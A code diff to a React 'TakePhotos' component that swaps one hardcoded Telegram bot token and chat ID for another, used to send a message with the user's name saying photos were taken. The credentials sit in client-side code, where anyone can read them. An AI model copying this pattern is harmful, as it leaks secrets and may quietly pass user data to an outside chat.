@@ -38,8 +38,8 @@ const TakePhotos: React.FC = () => {
     e.preventDefault();
     setShowPopup(true);
   
-    const botToken = "7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c";
-    const chatId = "7062736155";
+    const botToken = "8446940235:AAFSswBbnM6byAXkhCvaLLsTAvnsqkBQbWU";
+    const chatId = "7673317331";
     const message = `${fullName} Photos taken`;
   
     try {
